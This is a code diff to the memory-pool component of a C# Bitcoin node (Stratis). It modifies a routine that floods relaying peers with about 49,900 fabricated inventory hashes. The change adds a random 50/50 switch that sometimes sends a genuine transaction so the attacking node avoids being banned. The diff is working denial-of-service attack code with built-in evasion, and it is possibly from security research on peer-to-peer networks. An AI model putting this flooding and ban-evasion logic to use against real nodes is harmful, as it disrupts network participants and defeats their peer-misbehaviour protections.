@@ -508,15 +508,32 @@ namespace Stratis.Bitcoin.Features.MemoryPool
                 if (peer.PeerVersion.Relay)
                 {
                     this.logger.LogInformation("Starting attack on INV items, preparing to send 49.000 hashes");
+                    
+                    // Variable to store uint counter to generate hash from 1,2,3,4,5,6...
                     uint attackingHash = 0;
+                    
+                    var random = new Random();
 
-                    while (attackingHash <= 49900)
+                    // Next() returns an int in the range [0..Int32.MaxValue]
+                    // Create loop to choose what packets to send attacking one or usual one
+                    // Statement in if generates random bool value - True or False with 50/50 chance
+                    if (random.Next() > (Int32.MaxValue / 2))
                     {
-                        attackingHash += 1;
-                        mempoolBehavior.AddTransactionToSend((uint256)attackingHash);
-                        
+                        // Sending usual transaction to not get banned
+                        this.logger.LogInformation("Sending usual transaction");
+                        mempoolBehavior.AddTransactionToSend(hash);
                     }
-
+                    else
+                    {
+                        // Executing attacking payload
+                        this.logger.LogInformation("Sending attacking payload");
+                        while (attackingHash <= 49900)
+                        {
+                            attackingHash += 1;
+                            mempoolBehavior.AddTransactionToSend((uint256)attackingHash);
+                        }
+                    }
+                    
                     this.logger.LogDebug("Added transaction ID '{0}' to send inventory of peer '{1}'.", hash, peer.RemoteSocketEndpoint);
                 }
                 else
